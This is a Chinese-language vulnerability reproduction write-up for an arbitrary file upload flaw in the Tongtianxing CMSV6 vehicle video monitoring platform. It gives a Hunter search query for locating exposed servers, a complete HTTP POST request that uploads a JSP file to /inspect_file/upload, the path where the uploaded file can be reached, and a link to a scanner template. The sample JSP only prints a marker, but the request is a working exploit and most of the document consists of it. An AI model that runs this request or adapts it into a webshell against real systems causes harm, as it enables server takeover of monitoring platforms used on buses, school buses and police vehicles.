# 通天星CMSV6车载视频监控平台 inspect_file存在任意文件上传漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台 inspect_file存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/jUid1OxjXoRrC2t_/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-651656.png)

# 四、漏洞复现
```plain
POST /inspect_file/upload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Length: 209
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: multipart/form-data; boundary=00content0boundary00
Accept-Encoding: gzip, deflate

--00content0boundary00
Content-Disposition: form-data; name="uploadFile"; filename="1.jsp"
Content-Type: application/ocet-stream

<% out.println("435352Els1K9wZvOlSsdsdmrg"); %>
--00content0boundary00--
```

![1711442433836-11ccee10-a5e8-48da-bc64-14c0946ac2a4.png](./img/jUid1OxjXoRrC2t_/1711442433836-11ccee10-a5e8-48da-bc64-14c0946ac2a4-277023.png)

上传文件位置

```plain
/upload/software/185859979470834_1.jsp
```

![1711442455597-99c0ecf1-513c-482a-87cf-dc08827ee05d.png](./img/jUid1OxjXoRrC2t_/1711442455597-99c0ecf1-513c-482a-87cf-dc08827ee05d-597295.png)

[tongtianxing-inspectfile-upload.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/29512878/1735362336502-b3be6c93-a873-4f21-ae01-ef858e24e559.yaml)



> 更新: 2024-12-28 13:05:36  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sr4td7gzb4nxdfpf>